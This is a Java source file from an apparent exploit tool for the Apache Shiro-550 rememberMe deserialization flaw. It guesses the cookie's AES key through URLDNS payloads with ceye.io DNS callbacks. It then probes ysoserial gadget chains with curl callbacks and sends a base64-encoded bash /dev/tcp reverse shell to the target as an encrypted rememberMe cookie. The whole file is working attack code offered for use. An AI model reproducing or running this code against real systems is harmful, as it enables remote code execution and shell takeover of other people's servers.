package com.shiroExploit.vulnverifier;

import com.shiroExploit.core.AesEncrypt;
import com.shiroExploit.util.*;
import org.apache.commons.codec.binary.Base64;
import java.io.File;
import java.util.*;

public class Shiro550VerifiertUsingCeye implements Verifier {
    private Config config;
    private String key;
    private List<PayloadType> gadgets;

    public Shiro550VerifiertUsingCeye(){
        System.out.println("[*] Using Shiro550VerifiertUsingCeye");
        this.config = Config.getInstance();
        this.gadgets = new ArrayList<>();
    }


    @Override
    public void getValidGadget() throws ExploitFailedException {
        Map<String, String> keyMap = sendURLDNSPayloads();
        this.key = Tools.getValidKeyFromCeye(keyMap, config.getCeyeToken());
        if(this.key == null){
            throw new ExploitFailedException("[-] Can not find a valid key");
        }
        System.out.println("[+] Find Valid Key: " + this.key);

        Map<String, PayloadType> gadgetMap = sendAllCurlPayloads();
        this.gadgets = Tools.getValidGadgetsFromCeye(gadgetMap, config.getCeyeToken());
        if(this.gadgets.size() == 0){
            throw new ExploitFailedException("[-] Can not find a valid gadget");
        }

        for(PayloadType type : gadgets){
            System.out.println("[+] Find Valid Gadget: " + type.getName());
        }
    }

    @Override
    public void getReverseShell(){
        String str = "bash -i >& /dev/tcp/" + config.getReverseShellIP() + "/" + config.getReverseShellPort() + " 0>&1";
        String base64 = Base64.encodeBase64String(str.getBytes());
        String cmd = "bash -c {echo," + base64 + "}|{base64,-d}|{bash,-i}";

        for(PayloadType type : this.gadgets){
            String command = "java -jar " + System.getProperty("user.dir") + File.separator + "ysoserial.jar " + type.getName() + " \"" + cmd + "\"";
            byte[] result = Tools.exec(command);
            String rememberMe = AesEncrypt.encrypt(this.key, result);
            System.out.println("[+] 反弹Shell payload：");
            System.out.println("rememberMe=" + rememberMe);
            HttpRequest.request(config.getTargetURL(), rememberMe);
        }
    }


    private Map<String,PayloadType> sendAllCurlPayloads(){
        Map<String, PayloadType> map = new HashMap<>();

        for(PayloadType payloadType : PayloadType.values()){
            System.out.println("[*] Trying Gadget: " + payloadType.getName());
            String uuid = UUID.randomUUID().toString().replaceAll("-", "");
            String command = "java -jar " + System.getProperty("user.dir") + File.separator + "ysoserial.jar " + payloadType.getName() + " \"curl http://" + uuid + "." + config.getCeyeDomain() + "\"";
            byte[] payload = Tools.exec(command);
            String rememberMe = AesEncrypt.encrypt(this.key, payload);
            HttpRequest.request(config.getTargetURL(), rememberMe);
            map.put(uuid,payloadType);
        }

        return map;
    }

    private Map<String,String> sendURLDNSPayloads(){
        System.out.println("[*] Send URLDNS Payload");
        Map<String, String> map = new HashMap<>();

        for(String key : config.getKyes()){
            System.out.println("[*] Trying Key: " + key);
            String uuid = UUID.randomUUID().toString().replaceAll("-", "");
            String command = "java -jar " + System.getProperty("user.dir") + File.separator + "ysoserial.jar URLDNS " + "http://" + uuid + "." + config.getCeyeDomain();
            byte[] payload = Tools.exec(command);
            String rememberMe = AesEncrypt.encrypt(key, payload);
            HttpRequest.request(config.getTargetURL(), rememberMe);
            map.put(uuid, key);
        }

        return map;
    }
}
